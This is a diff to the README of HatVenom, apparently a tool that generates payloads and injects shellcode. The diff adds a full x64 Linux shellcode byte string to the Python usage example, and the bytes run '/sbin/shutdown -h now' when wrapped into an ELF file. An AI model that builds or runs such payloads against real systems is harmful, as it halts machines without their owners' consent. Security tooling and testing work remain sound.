@@ -5,7 +5,7 @@ Powerful payload generation and shellcode injection tool that provides support f
 ## CLI examples
 
 ```bash
-python3 hatvenom.py --format elf --arch x64 --shellcode '\x90\x90\x90'
+python3 hatvenom.py --format elf --arch x64 --shellcode <shellcode>
 ```
 
 ## Python example
@@ -13,6 +13,18 @@ python3 hatvenom.py --format elf --arch x64 --shellcode '\x90\x90\x90'
 ```python
 from hatvenom import HatVenom
 
+shellcode = (
+    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
+    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
+    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
+    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
+    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
+    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
+    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
+    b"\x05"
+)
+
 hatvenom = HatVenom()
-hatvenom.generate_to('elf', 'x64', b'\x90\x90\x90')
+hatvenom.generate_to('elf', 'x64', shellcode)
 ```
